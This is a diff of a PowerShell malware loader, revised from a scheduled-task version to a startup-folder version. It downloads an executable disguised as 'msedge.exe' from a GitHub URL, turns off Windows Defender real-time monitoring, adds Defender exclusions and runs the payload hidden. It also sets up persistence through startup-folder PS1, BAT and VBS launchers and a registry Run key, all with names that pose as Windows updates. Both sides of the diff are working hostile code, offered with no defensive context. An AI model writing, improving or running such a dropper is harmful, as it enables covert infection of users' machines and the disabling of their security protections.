@@ -1,147 +1,117 @@
-# Focus on creating an exclusion before execution
+# Simple startup approach
 $downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
-$tempPath = "$env:TEMP\data.exe"
-$logPath = "$env:TEMP\debug.log"
+$logPath = "$env:TEMP\startup_log.txt"
 
-# Simple logging
-"$(Get-Date) - Starting exclusion setup" | Out-File $logPath
+"$(Get-Date) - Starting startup script setup" | Out-File $logPath
 
-# Function to create a scheduled task that will run with elevated privileges
-function Create-ElevatedTask {
-    param($scriptContent)
+# Create a PowerShell startup script
+$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$startupPs1 = "$startupFolder\windows_update.ps1"
+
+try {
+    "$(Get-Date) - Creating startup PowerShell script" | Out-File $logPath -Append
     
-    # Save script to temp file
-    $scriptPath = "$env:TEMP\task_script.ps1"
-    $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
-    
-    # Create task name
-    $taskName = "DefenderSettings_$(Get-Random)"
-    
-    # Create the task
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
-    $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -RunLevel Highest
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-    
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
-    
-    return $taskName
+    # PowerShell script content
+    $psScript = @"
+# Startup script for Windows Update Service
+`$logFile = "$env:TEMP\startup_execution.log"
+"Started execution at `$(Get-Date)" | Out-File `$logFile
+
+# Try to disable protection first
+try {
+    "Attempting to disable protection" | Out-File `$logFile -Append
+    Set-MpPreference -DisableRealtimeMonitoring `$true -Force -ErrorAction SilentlyContinue
+    "Disabled protection" | Out-File `$logFile -Append
+} catch {
+    "Failed to disable protection: `$_" | Out-File `$logFile -Append
 }
 
-# Download the file if it doesn't exist
-if (!(Test-Path $tempPath)) {
-    try {
-        "$(Get-Date) - Downloading file" | Out-File $logPath -Append
-        (New-Object Net.WebClient).DownloadFile($downloadUrl, $tempPath)
+# Download the file
+`$downloadUrl = "$downloadUrl"
+`$downloadPath = "`$env:TEMP\winupdate.exe"
+
+try {
+    "Downloading file" | Out-File `$logFile -Append
+    (New-Object Net.WebClient).DownloadFile(`$downloadUrl, `$downloadPath)
+    
+    if (Test-Path `$downloadPath) {
+        "Download successful" | Out-File `$logFile -Append
         
-        if (Test-Path $tempPath) {
-            $fileSize = (Get-Item $tempPath).Length
-            "$(Get-Date) - Downloaded successfully: $fileSize bytes" | Out-File $logPath -Append
+        # Add exclusion
+        try {
+            "Adding exclusion" | Out-File `$logFile -Append
+            Add-MpPreference -ExclusionPath `$downloadPath -ErrorAction SilentlyContinue
+            "Exclusion added" | Out-File `$logFile -Append
+        } catch {
+            "Failed to add exclusion: `$_" | Out-File `$logFile -Append
         }
-    } catch {
-        "$(Get-Date) - Download error: $_" | Out-File $logPath -Append
+        
+        # Try to run
+        try {
+            "Attempting to run" | Out-File `$logFile -Append
+            Start-Process -FilePath `$downloadPath -ArgumentList "/silent"
+            "Process started" | Out-File `$logFile -Append
+        } catch {
+            "Failed to run: `$_" | Out-File `$logFile -Append
+            
+            # Try alternative run method
+            try {
+                "Trying alternative run method" | Out-File `$logFile -Append
+                `$startInfo = New-Object System.Diagnostics.ProcessStartInfo
+                `$startInfo.FileName = `$downloadPath
+                `$startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+                [System.Diagnostics.Process]::Start(`$startInfo)
+                "Alternative method used" | Out-File `$logFile -Append
+            } catch {
+                "Alternative method failed: `$_" | Out-File `$logFile -Append
+            }
+        }
+    } else {
+        "Download failed - file not found" | Out-File `$logFile -Append
     }
-} else {
-    "$(Get-Date) - File already exists" | Out-File $logPath -Append
-}
-
-# Create script content for the elevated task
-$elevatedScript = @"
-# Configure logging
-`$logPath = "$logPath" 
-"``$(Get-Date) - Elevated task starting" | Out-File -FilePath `$logPath -Append
-
-# Try to disable real-time protection
-try {
-    "``$(Get-Date) - Attempting to disable real-time protection" | Out-File -FilePath `$logPath -Append
-    Set-MpPreference -DisableRealtimeMonitoring `$true -Force
-    "``$(Get-Date) - Disabled real-time protection" | Out-File -FilePath `$logPath -Append
 } catch {
-    "``$(Get-Date) - Failed to disable real-time protection: `$_" | Out-File -FilePath `$logPath -Append
+    "Error during download: `$_" | Out-File `$logFile -Append
 }
 
-# Add exclusion for the file
-try {
-    "``$(Get-Date) - Adding file exclusion for $tempPath" | Out-File -FilePath `$logPath -Append
-    Add-MpPreference -ExclusionPath "$tempPath" -Force
-    "``$(Get-Date) - Added file exclusion" | Out-File -FilePath `$logPath -Append
-} catch {
-    "``$(Get-Date) - Failed to add file exclusion: `$_" | Out-File -FilePath `$logPath -Append
-}
-
-# Try different exclusion methods if the first one fails
-try {
-    "``$(Get-Date) - Adding process exclusion" | Out-File -FilePath `$logPath -Append
-    Add-MpPreference -ExclusionProcess "$tempPath" -Force
-    "``$(Get-Date) - Added process exclusion" | Out-File -FilePath `$logPath -Append
-} catch {
-    "``$(Get-Date) - Failed to add process exclusion: `$_" | Out-File -FilePath `$logPath -Append
-}
-
-# Try to run the file
-try {
-    "``$(Get-Date) - Attempting to run file from elevated context" | Out-File -FilePath `$logPath -Append
-    Start-Process -FilePath "$tempPath" -ArgumentList "/silent"
-    "``$(Get-Date) - Process start attempted" | Out-File -FilePath `$logPath -Append
-    
-    # Alternative execution method
-    "``$(Get-Date) - Trying alternative execution" | Out-File -FilePath `$logPath -Append
-    `$bytes = [System.IO.File]::ReadAllBytes("$tempPath")
-    `$altPath = "`$env:TEMP\\alt_``$(Get-Random).exe"
-    [System.IO.File]::WriteAllBytes(`$altPath, `$bytes)
-    
-    # Also exclude this path
-    Add-MpPreference -ExclusionPath `$altPath -Force
-    
-    # Run alternative
-    Start-Process -FilePath `$altPath -ArgumentList "/silent"
-    "``$(Get-Date) - Alternative execution attempted" | Out-File -FilePath `$logPath -Append
-} catch {
-    "``$(Get-Date) - Execution failed: `$_" | Out-File -FilePath `$logPath -Append
-}
-
-# Create startup entries to run on next boot
-try {
-    "``$(Get-Date) - Adding to startup registry" | Out-File -FilePath `$logPath -Append
-    Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "SecurityUpdate" -Value "`"$tempPath`" /silent" -Force
-    
-    # Also create a scheduled task that runs at logon
-    `$action = New-ScheduledTaskAction -Execute "$tempPath" -Argument "/silent"
-    `$trigger = New-ScheduledTaskTrigger -AtLogOn
-    Register-ScheduledTask -TaskName "SecurityUpdate" -Action `$action -Trigger `$trigger -Force
-    "``$(Get-Date) - Created startup entries" | Out-File -FilePath `$logPath -Append
-} catch {
-    "``$(Get-Date) - Failed to create startup entries: `$_" | Out-File -FilePath `$logPath -Append
-}
-
-"``$(Get-Date) - Elevated task completed" | Out-File -FilePath `$logPath -Append
+"Startup script completed at `$(Get-Date)" | Out-File `$logFile -Append
 "@
-
-# Create the elevated task
-try {
-    "$(Get-Date) - Creating elevated task" | Out-File $logPath -Append
-    $taskName = Create-ElevatedTask -scriptContent $elevatedScript
-    "$(Get-Date) - Created task: $taskName" | Out-File $logPath -Append
-} catch {
-    "$(Get-Date) - Failed to create task: $_" | Out-File $logPath -Append
-}
-
-# Also create a startup VBS as fallback
-try {
-    "$(Get-Date) - Creating VBS startup script" | Out-File $logPath -Append
-    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-    $vbsPath = "$startupFolder\system_update.vbs"
     
-    # VBS content - runs the exe but also tries to first disable protection
+    # Write the PowerShell script
+    $psScript | Out-File -FilePath $startupPs1 -Encoding UTF8
+    "$(Get-Date) - PowerShell script written to $startupPs1" | Out-File $logPath -Append
+    
+    # Create a .bat launcher for the PowerShell script (more reliable at startup)
+    $startupBat = "$startupFolder\update.bat"
+    $batContent = @"
+@echo off
+PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$startupPs1"
+"@
+    
+    $batContent | Out-File -FilePath $startupBat -Encoding ASCII
+    "$(Get-Date) - BAT launcher written to $startupBat" | Out-File $logPath -Append
+    
+    # Create a VBS launcher as well (even more reliable, runs hidden)
+    $startupVbs = "$startupFolder\system_service.vbs"
     $vbsContent = @"
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -WindowStyle Hidden -Command ""Set-MpPreference -DisableRealtimeMonitoring `$true -Force; Start-Sleep -Seconds 2; Start-Process -FilePath '$tempPath' -ArgumentList '/silent'""", 0, False
+objShell.Run "PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$startupPs1""", 0, False
 "@
     
-    $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
-    "$(Get-Date) - VBS created at $vbsPath" | Out-File $logPath -Append
+    $vbsContent | Out-File -FilePath $startupVbs -Encoding ASCII
+    "$(Get-Date) - VBS launcher written to $startupVbs" | Out-File $logPath -Append
+    
 } catch {
-    "$(Get-Date) - VBS error: $_" | Out-File $logPath -Append
+    "$(Get-Date) - Error creating startup scripts: $_" | Out-File $logPath -Append
 }
 
-"$(Get-Date) - Script completed. Elevated task will run soon." | Out-File $logPath -Append
+# Add registry startup entry as well
+try {
+    "$(Get-Date) - Adding registry startup entry" | Out-File $logPath -Append
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    Set-ItemProperty -Path $regPath -Name "SystemMaintenance" -Value "wscript.exe `"$startupVbs`"" -Force
+    "$(Get-Date) - Registry entry added" | Out-File $logPath -Append
+} catch {
+    "$(Get-Date) - Failed to add registry entry: $_" | Out-File $logPath -Append
+}
+
+"$(Get-Date) - Setup completed. Script will run at next login." | Out-File $logPath -Append
